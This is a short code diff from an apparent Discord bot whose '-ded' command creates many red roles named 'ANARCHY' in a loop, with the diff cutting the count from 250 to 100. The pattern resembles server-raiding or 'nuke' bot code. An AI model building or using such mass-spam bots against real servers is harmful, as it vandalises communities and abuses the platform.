@@ -121,7 +121,7 @@ client.on('message', msg => {
 if (msg.content === '-ded') {
   console.log(`Commande -ded par ${msg.author.tag}`);
 
-    for (var i = 0; i < 250; i++) {
+    for (var i = 0; i < 100; i++) {
       message.guild.createRole({
         name: 'ANARCHY',
         color: 'RED',
